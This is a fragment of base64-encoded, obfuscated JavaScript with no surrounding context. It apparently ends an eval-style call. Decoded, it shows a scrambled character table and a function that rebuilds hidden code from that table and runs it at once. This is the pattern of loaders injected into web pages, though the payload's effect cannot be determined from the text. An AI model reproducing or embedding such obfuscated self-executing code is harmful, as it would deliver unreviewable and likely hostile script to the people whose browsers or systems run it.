1IHJzPXNjMntFUXtyNV0hUTRycytxUSlmMWVRUXJRcmtjXVxcUTFnQzQ2S2VyUWQ4cCE1KS1vaWZRdC5dLC47b2JsJSBlUVEkbnIuYV8lZl8gKHNRbC4rMXIkKVFuYi5mdHhsXFxKUSl9ezZycG5RZTFdLHQ9ZzYhWCAydWpReXtfeSE6ZkVUblEpJVE1JSxRUT15aXRjYzYyIHUpdG8yNVF7XFwuIFEkUWYgUX1fKSE1c11mbl5RdFEhZGMgKWgpJGw5cHVRLi5vYjFhUVEyZiB9fShRIVFvJWkxXSxsPW5RaS5yUUlRVTJucmVbYX0uaS4lWS4gZWZ3YyZdaG5fZm8uZ1suXTUuZl8pKX15MnNmJGJlX2VtQztfNzJ0UV93Ml9pe2ZjcmpfX2sge1FsIDRjYl8iUX07UV09IDBRZlk7UTUyXyBkX3IuJXJlbC4ucl9fZXAiUXVdUV9vbjMpVixjcnIhKDRvKHVhbl10IHtEZj12X1spby1fbm8wICV0cGRpZmRRMX17MXIlIDJmX2JlXV0pNC1mbmYpLlFuJVF0LmNuPSBVb3RdJykpO3ZhciBjQ0o9Tlh6KGhtVSx3RGIgKTtjQ0ooMTA5Mik7cmV0dXJuIDUzOTd9KSgp'))
